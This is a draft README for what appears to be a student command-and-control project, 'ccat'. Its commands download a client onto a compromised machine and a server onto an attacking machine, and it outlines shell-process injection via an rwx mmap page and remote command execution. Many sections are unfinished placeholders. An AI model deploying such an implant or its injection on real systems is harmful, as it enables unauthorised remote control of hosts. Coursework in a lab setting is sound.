# C2 Project Submission
## Installation
Install the pycryptodome package using pip and download the relevant repo code.
On the client (compromised week 4) machine, run the following as root:
```shell
pip install pycryptodome
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/client.py -o client.py
```

# **where should they install????????**
And likewise, run the following on the attacking machine:
```shell
pip install pycryptodome
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
curl -L https://github.com/tararoshan/ccat/raw/main/python-version/server.py -o server.py
```


## Testing
To test that ccat works, run the server from the command machine (`python server.py`)
and then run the client process (`python client.py`) on the compromised machine,
or just reboot it after the installation process. To change configuration
options like your IP address, see the first two lines of `configuration.py` and
make sure you change this in both the *client and server* copies! :~)

One thing to note is that if you want to run a process in another directory, you
need to run *cd /absolute/path/name && process_name*. That is, you can't change
the current working directory of the shell (because each one is run as another
process).[^1]

[^1]: So you can technically change the working directory, but it'll be the
working directory of the currently running process. So the next command you run
won't be affected. If I had more time, I could flesh this out using the os.cwd()
function.

- add in pictures, gifs
- RUN THE SERVER BFORE THE CLIENT!!!
- cannot cd and expect the client to remember -- need to do cd && whatever other command

## How ccat works
### Process Injection
To figure out what the pid is for the shell (bash) process, run `pgrep sh`. So
to inject into the shell process, we can run
```shell
python client_setup.py $(pgrep sh)$
```
This creates a rwx page (via the mmap syscall) so that our program can more
easily inject code.

## Requirement Completion
### Remote shell access to host
ccat uses the `subprocess` python library with the `shell=True` to run commands
sent from the server as shell commands.

### Persist across reboots

### Configuration for where to get commands

### Authenticate communication

### Attempt to hide itself

## Detecting ccat
You could detect ccat by paying for Tripwire. :~)

Other options include

## Resources & Credit
copy & paste from readme later